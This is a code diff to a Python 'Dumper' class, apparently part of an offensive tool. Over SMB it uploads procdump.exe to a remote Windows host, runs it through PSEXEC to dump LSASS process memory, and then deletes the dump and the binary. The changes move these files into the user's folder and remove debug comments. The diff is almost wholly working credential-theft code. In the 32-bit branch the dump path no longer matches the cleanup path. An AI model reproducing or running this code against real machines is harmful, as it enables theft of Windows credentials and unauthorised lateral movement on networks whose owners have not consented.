@@ -50,7 +50,6 @@ class Dumper:
             domain=self.credentials["domain"],
         )
         os = self.smb.getServerOS()
-        # pdb.set_trace()
         arch = self.get_arch()
         domain = self.smb.getServerDomain()
         info_dict.update({"target": self.target})
@@ -83,26 +82,32 @@ class Dumper:
 
             dce.disconnect()
         except Exception as e:
-            # import traceback
-            # traceback.print_exc()
             print(f"{self.target}, {str(e)}")
 
     def upload_file(self):
         if self.host_info["arch"] == 64:
             src = src_x64
             filename = re.sub(r"\d+", "", path.basename(src))
-            self.smb.putFile("C$", filename, open(src, "rb").read)
+            self.smb.putFile(
+                "C$",
+                f"\\Users\\{self.credentials['username']}\\{filename}",
+                open(src, "rb").read,
+            )
         elif self.host_info["arch"] == 32:
             src = src_x32
             filename = re.sub(r"\d+", "", path.basename(src))
-            self.smb.putFile("C$", filename, open(src, "rb").read)
+            self.smb.putFile(
+                "C$",
+                f"\\Users\\{self.credentials['username']}\\{filename}",
+                open(src, "rb").read,
+            )
         else:
             print("Something went wrong")
             sys.exit(1)
 
     def exec_procdump(self):
         executer = PSEXEC(
-            " ".join(["C:\\procdump.exe -accepteula"]),
+            f"C:\\Users\\{self.credentials['username']}\\procdump.exe -accepteula",
             None,
             None,
             None,
@@ -121,7 +126,7 @@ class Dumper:
         )
         if self.host_info["arch"] == 64:
             executer = PSEXEC(
-                " ".join(["C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump"]),
+                f"C:\\Users\\{self.credentials['username']}\\procdump.exe -ma -64 lsass.exe C:\\Users\\{self.credentials['username']}\\lsass_dump",
                 None,
                 None,
                 None,
@@ -137,7 +142,7 @@ class Dumper:
             )
         else:
             executer = PSEXEC(
-                " ".join(["C:\\procdump.exe -ma lsass.exe C:\\lsass_dump"]),
+                f"C:\\Users\\{self.credentials['username']}\\procdump.exe -ma lsass.exe C:\\lsass_dump",
                 None,
                 None,
                 None,
@@ -162,8 +167,12 @@ class Dumper:
 
     def clear_out(self):
         print("Starting ClearOut")
-        self.smb.deleteFile("C$", "/lsass_dump.dmp")
-        self.smb.deleteFile("C$", "/procdump.exe")
+        self.smb.deleteFile(
+            "C$", f"\\Users\\{self.credentials['username']}\\lsass_dump.dmp"
+        )
+        self.smb.deleteFile(
+            "C$", f"\\Users\\{self.credentials['username']}\\procdump.exe"
+        )
         self.smb.close()
         print("ClearOut Finished")
 
